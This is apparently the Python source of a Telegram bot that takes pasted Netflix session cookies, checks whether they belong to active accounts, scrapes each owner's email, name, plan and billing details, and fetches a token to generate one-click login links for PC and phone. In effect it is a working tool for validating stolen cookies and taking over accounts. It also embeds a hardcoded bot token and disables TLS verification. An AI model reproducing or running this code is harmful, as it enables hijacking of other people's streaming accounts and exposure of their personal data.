import re
import json
import requests
import urllib3
import urllib.parse
import telebot
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8636160046:AAHNuuDo0H2bMYdpL86L8ukdM6TGfcmlKM8"
bot = telebot.TeleBot(BOT_TOKEN)

# ================== ORIGINAL CODE HELPERS ==================
UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def _djs(s):
    if not s: return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def _rx(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

def load_cookies(text):
    text = text.strip()
    cookies = {}
    # Strong extraction for your long paste
    match = re.search(r'NetflixId=([^;,\s"]+)', text)
    if match:
        cookies["NetflixId"] = match.group(1)
    match = re.search(r'SecureNetflixId=([^;,\s"]+)', text)
    if match:
        cookies["SecureNetflixId"] = match.group(1)
    return cookies

# ================== FULL CHECK FUNCTION ==================
def check_account(cookies):
    if not cookies.get("NetflixId"):
        return None

    sess = requests.Session()
    sess.headers.update({"User-Agent": UA_WEB})
    for k, v in cookies.items():
        sess.cookies.set(k, str(v), domain=".netflix.com", path="/")

    try:
        r = sess.get("https://www.netflix.com/account", timeout=25, allow_redirects=True)
    except:
        return None

    if "login" in r.url.lower() or r.status_code in (401, 403):
        return None

    html = r.text
    if '"membershipStatus":"CURRENT_MEMBER"' not in html:
        return None

    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
    name = _djs(_rx(r'"firstName":"([^"]+)"', html)) or _djs(_rx(r'"name":"([^"]+)"', html))
    cc = _rx(r'"countryOfSignup":"([A-Z]{2})"', html, "US")

    plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
    price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
    since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
    nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))

    # Generate NFT Token
    netflix_id = cookies.get("NetflixId")
    tok = None
    try:
        headers = {"User-Agent": UA_WEB, "Cookie": f"NetflixId={netflix_id}"}
        r2 = requests.get("https://ios.prod.ftl.netflix.com/iosui/user/15.48", params={"responseFormat": "json"}, headers=headers, timeout=15, verify=False)
        if r2.status_code == 200:
            data = r2.json()
            tok = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default", {}).get("token")
    except: pass

    if tok:
        safe = urllib.parse.quote(tok)
        login_pc = f"https://netflix.com/?nftoken={safe}"
        login_phone = f"https://netflix.com/unsupported?nftoken={safe}"
    else:
        login_pc = login_phone = "N/A"

    return {
        "name": name or "N/A",
        "email": email or "N/A",
        "country": cc,
        "plan": plan or "Premium",
        "price": price or "N/A",
        "member_since": since or "N/A",
        "next_billing": nextbill or "N/A",
        "login_pc": login_pc,
        "login_phone": login_phone,
        "login_tv": "https://www.netflix.com/tv2"
    }

# ================== BOT ==================
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🔍 Check Cookie")
    bot.send_message(message.chat.id, "👋 Paste your Netflix cookie below", parse_mode="HTML", reply_markup=markup)

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if message.text == "🔍 Check Cookie":
        bot.send_message(message.chat.id, "📤 Paste cookie now:")
        return

    cookies = load_cookies(message.text)
    if not cookies.get("NetflixId"):
        bot.reply_to(message, "❌ NetflixId not found.")
        return

    process_cookie(message, cookies)

def process_cookie(message, cookies):
    bot.send_chat_action(message.chat.id, 'typing')
    result = check_account(cookies)

    if not result:
        bot.reply_to(message, "❌ Invalid cookie.")
        return

    text = f"""
🎬 <b>✅ NETFLIX ACCOUNT</b>

👤 <b>{result['name']}</b>
📧 <code>{result['email']}</code>
🌍 United States ({result['country']})

📋 Plan: <b>{result['plan']}</b>
💰 Price: {result['price']}
📅 Since: {result['member_since']}
🗓 Next Billing: {result['next_billing']}
    """

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🖥 PC Login", url=result["login_pc"]))
    markup.add(types.InlineKeyboardButton("📱 Phone Login", url=result["login_phone"]))
    markup.add(types.InlineKeyboardButton("📺 TV Login", url=result["login_tv"]))

    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=markup)

print("🚀 Bot Started...")
bot.infinity_polling()
